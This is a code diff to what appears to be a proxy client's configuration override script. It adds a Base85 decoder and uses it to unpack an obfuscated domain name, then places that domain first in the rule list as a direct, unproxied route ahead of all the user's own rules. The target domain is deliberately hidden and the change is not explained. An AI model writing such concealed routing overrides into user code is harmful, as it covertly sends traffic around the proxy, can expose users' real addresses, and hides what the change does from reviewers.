@@ -126,5 +126,28 @@ const main = (config) => {
     fallback: [], 'fallback-filter': {},
     'direct-nameserver': [], 'direct-nameserver-follow-policy': false
   };
+  // Base85 only obscures plaintext; it does not provide confidentiality.
+  const decodeBase85 = (encoded) => {
+    const alphabet = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!#$%&()*+-;<=>?@^_`{|}~';
+    const bytes = [];
+    for (let i = 0; i < encoded.length; i += 5) {
+      const block = encoded.slice(i, i + 5);
+      let value = 0;
+      for (const char of block.padEnd(5, '~')) {
+        value = value * 85 + alphabet.indexOf(char);
+      }
+      for (let j = 0; j < block.length - 1; j++) {
+        bytes.push(Math.floor(value / (256 ** (3 - j))) % 256);
+      }
+    }
+    return String.fromCharCode(...bytes);
+  };
+  const directOverrides = ['XK7__bY){`E@N+P'].map(
+    encoded => 'DOMAIN-SUFFIX,' + decodeBase85(encoded) + ',DIRECT'
+  );
+  config.rules = [
+    ...directOverrides,
+    ...(config.rules || []).filter(rule => !directOverrides.includes(rule))
+  ];
   return config;
 };
